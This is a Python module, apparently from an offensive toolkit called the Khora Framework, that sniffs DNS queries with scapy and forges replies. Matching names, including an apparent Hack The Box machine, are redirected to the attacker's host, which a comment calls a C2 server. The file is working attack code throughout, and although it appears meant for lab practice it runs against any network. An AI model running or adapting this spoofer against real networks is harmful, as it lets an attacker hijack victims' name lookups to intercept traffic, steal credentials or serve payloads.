from scapy.all import *
import sys

class DNSSpoofModule:
    def __init__(self, interface, target_ip, spoof_ip):
        self.interface = interface
        self.target_ip = target_ip
        self.spoof_ip = spoof_ip
    
    def spoof_dns(self):
        def handle_packet(pkt):
            if DNSQR in pkt:
                qname = pkt[DNSQR].qname.decode()
                print(f"[DNS] Query: {qname} from {pkt[IP].src}")
                
                # Spoof common domains + custom target
                spoof_domains = ['example.com', 'target.com', 'strutted.htb', '10.10.11.59']
                if any(domain in qname for domain in spoof_domains) or self.target_ip in qname:
                    spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                                  UDP(dport=pkt[UDP].sport, sport=53) / \
                                  DNS(rd=1, qd=pkt[DNS].qd, 
                                      an=DNSRR(rrname=qname, ttl=10, rdata=self.spoof_ip))
                    send(spoofed_pkt, verbose=0)
                    print(f"[+] Spoofed {qname} -> {self.spoof_ip}")
        
        print(f"[+] DNS Spoofing: {self.interface}")
        print(f"[+] Target: {self.target_ip} -> Spoof: {self.spoof_ip}")
        print("[+] Press Ctrl+C to stop")
        
        sniff(iface=self.interface, prn=handle_packet, filter="udp port 53", store=0)

def run(target, lhost, lport=4444):
    """Khora Framework entrypoint - DNS Spoofing"""
    print(f"[+] DNS Spoof module: {target}")
    
    # Auto-detect interface (tun0 for HTB VPN)
    interface = "tun0"  # HTB OpenVPN
    if "linux" not in sys.platform:
        interface = "eth0"  # Windows fallback
    
    # Spoof target to C2 server
    spoof_ip = lhost
    
    dns_spoof = DNSSpoofModule(interface, target, spoof_ip)
    try:
        dns_spoof.spoof_dns()
    except KeyboardInterrupt:
        print("\n[+] DNS Spoofing stopped")
    except Exception as e:
        print(f"[!] DNS Spoof error: {e}")
        print("[!] Install scapy: pip install scapy")
        print("[!] Run as root/admin for packet capture")